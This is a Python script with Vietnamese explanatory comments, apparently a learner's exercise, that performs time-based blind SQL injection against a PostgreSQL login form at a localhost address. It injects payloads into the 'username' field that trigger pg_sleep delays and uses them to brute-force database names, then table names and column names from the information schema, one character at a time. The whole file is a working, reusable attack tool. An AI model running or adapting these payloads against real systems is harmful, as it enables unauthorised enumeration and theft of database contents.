import requests
common_db_name = ["users","customers","products","orders","inventory","employees", "sales","transactions","reports","analytics","sessions","logs","feedback","reviews",
    "billing","payments","subscriptions","accounts","profiles","messages","notifications","events","tasks","projects","tickets","assets","settings","preferences","audit",
    "auth","roles","permissions","catalog","content","media","files","comments","likes","followers","activity","history","chats","posts","news","partners",
    "vendors","contracts","addresses","schedule","phuc","postgres"]

#cái này là một số database_name phổ biến, có thể lượm nhặt ở trên google, hoặc có list riêng

url = "http://localhost/basic/control/control.php"

# Url để brute-force

CHARSET = "apcdefghijklmnoqbrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

# Sử dụng các chữ cái và các kí tự

def is_successful_response(r):
    return r.elapsed.total_seconds() > 0.5
# Delay 0.5s trở lên thì đúng
db = ""
def dump_database():
    list_db = []
    #list db này là array chứa các database_name sau khi tìm được
    db = ""
    # biến db dùng để tạo thành một database name hoàn chỉnh
    while True:
        index = 1
        db = ""
        # Nếu đúng, thì đặt index = 1 ( Index ở đây là số thứ tự của db_name ), sau đó xoá hết db name vừa tìm ra. Tiếp tục với db name khác
        while True:
            found_c = False
            # Nếu đúng, đặt lại found kí tự = false, để brute-force lại từ đầu
            print("Tui test kí tự thứ   ", index)
            
            for c in CHARSET:
                db_not_in = "('" + "','".join(list_db) + "')"
                # Đầu tiên array list_db này trống, khi bắt đầu brute-force thành công được db name đầu tiên thì sẽ loại trừ db_name này ra.
                payload = "\'AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM ( SELECT datname FROM pg_database WHERE datname NOT IN {not_in} LIMIT 1) WHERE SUBSTRING(datname, {i}, 1) = '{brute}') THEN pg_sleep(0.5) ELSE NULL END LIMIT 1 ) IS NULL ;-- -".format(i=index,brute=c,not_in=db_not_in)
                # Payload này sẽ đưa ra trường hợp nếu datname không nằm trong list_db đã tìm được, 
                # và từng kí tự theo index của datname khớp với kí tự đang brute-force, thì sẽ cho hệ thống ngủ 0.5s
                r = requests.post(url, data=({'username':payload, 'password': '1'}), allow_redirects=False)
                # Cái này dùng để gửi gói post với username là payload, và password bất kì
                print("tui đang thử kí tự ---> ", c, " nè", end="\r")
                if is_successful_response(r):
                    # nếu delay 0.5s -> đúng, cộng chuỗi lại với nhau
                    db += c
                    found_c = True
                    # Đặt found_c bằng true, để đặt trường hợp nếu không true -> Sẽ bắt đầu với db kế tiếp,
                    # hoăcj table kế tiếp, hoặc columns kế tiếp
                    print("Kí tự thứ ", index, " là:", c, "---> database :", db)
                    break
            if not found_c:
                if index == 1:
                    # Nếu index = 1 mà tìm không ra được kí tự nào, kết thúc vòng lặp, quay lại từ đầu
                    break
                else:
                    index = 1
                    # Nếu index khác 1, mà tìm không ra. Thì đặt lại index = 1
                    break
            else: # nếu found_c -> tăng index lên 1 đơn vị
                index += 1
        if db: # nếu như tồn tại db ( brute-force được )
            list_db.append(db) # thêm cái db vừa tìm được vô list_db
            print("database là : ",list_db)
        else:
            break
    print("Database trong lần quét này là : ", list_db)
    return list_db

# Những phần dưới tương tự, nhưng có 1 phần columns thì hơi khác một chút

def dump_table(database_name):
    list_tables = []
    table = ""
    q = database_name
    while True:
        table = ""
        index = 1
        while True:
            found_c = False
            print ("tui đang test kí tự thứ ", index, " trong database ", database_name)
            for c in CHARSET:
                table_not_in = "('" + "','".join(list_tables) + "')"
                payload = "\'AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM (SELECT TABLE_NAME, TABLE_CATALOG FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema', 'pg_catalog') AND TABLE_NAME NOT IN {conca} LIMIT 1) WHERE SUBSTRING(TABLE_NAME, {i}, 1) = '{brute}' AND TABLE_CATALOG = '{db_name}') THEN pg_sleep(0.5) ELSE NULL END LIMIT 1 ) IS NULL ;-- -".format(i=index,brute=c,db_name=q,conca=table_not_in)
                p = requests.post(url, data=({'username':payload, 'password': '1'}), allow_redirects=False)
                print("tui đang thử kí tự table_name là: ", c ," trong database: ", q, end="\r")
                if is_successful_response(p):
                    table+= c
                    found_c = True
                    print("kí tự thứ: ", index, " là:", c, "--->" , table)
                    break
            if not found_c:
                if index == 1:
                    break
                else:
                    list_tables.append(table)
                    #print(f"Table tìm được là:" ,table)
                    table = ""
                    index = 1
                    continue
            else:
                index += 1
        if table:
            list_tables.append(table)
            print(f"Table là: {list_tables}")
        else:
            break
    return list_tables
def dump_columns(table_name,q):
    list_column = []
    column = ""
    p = table_name
    while True:
        index = 1
        column = ""
        while True:
            found_c = False
            print("Tui đang test kí tự thứ:", index," trong table:", p)
            for c in CHARSET:
                column_not_in = "('" + "','".join(list_column) + "')"
                payload = "\'AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG = '{db_name}' AND TABLE_SCHEMA NOT IN ('information_schema', 'pg_catalog') AND table_name = '{table}' AND COLUMN_NAME NOT IN {conca} LIMIT 1) WHERE SUBSTRING(COLUMN_NAME,{i},1) = '{brute}' ) THEN pg_sleep(0.5) ELSE NULL END) IS NULL;-- -".format(i=index,brute=c,db_name=q,table=p,conca=column_not_in)
                # payload này sẽ delay 0.5s, nếu như select 1, mà điều kiện để select 1. Đó chính là database của table trong information_schema.columns 
                # là database được chỉ định ( là một trong số các db đựoc tìm thấy ở trên ) VÀ table_schema không nằm trong 2 giá trị kia 
                # ( table_schema tức là cái cột đó thuộc bảng nào ) VÀ table name thuộc bảng chỉ định đã được tìm thấy, 
                # VÀ Column_name ko nằm trong các column đã tìm được
                # Hơi phức tạp nhỉ, mình cũng chả hiểu sao mình ngồi mò ra cái payload này được nữa :D . 
                # Vì về mặt logic thì mình có thể hiểu nhưng để ghi ra một câu với điều kiện loằng ngoằng thế này thì đây là lần đầu tiên mình làm
                # , có lẽ sau này cũng sẽ có cách khác tối ưu hơn
                s = requests.post(url, data=({'username':payload, 'password': '1'}), allow_redirects=False)
                print("tui đang thử kí tự column_name là: ", c ," trong database: ", q,"và table_name là:",p, end="\r")
                if is_successful_response(s):
                    column+= c
                    found_c = True
                    print("kí tự thứ: ", index, " là:", c , "--->", column)
                    break
            if not found_c:
                if index == 1:
                    #print("columns not in la:", column_not_in)
                    break
                else:
                    list_column.append(column)
                    #print(f"Column tìm được là:" ,column)
                    column = ""
                    index = 1
                    continue
            else:
                index += 1
        if column:
            list_column.append(column)
            #print(f"Column là: {list_column}")
        else:
            break
    return list_column
database = dump_database()
for data in database:
    if data in common_db_name:
        ketqua=dump_table(data)
        if ketqua:
            for i in ketqua:
                result=dump_columns(i,data)
                print("tồn tại column:", result," trong table:", i, ",database là:",data)
        print("Table trong database:", data, " là:", ketqua)
    else:
        print(f"database {data} có thể không nguy hiểm")
print("Database trong lần quét này là : ", database)
print("Table là ")





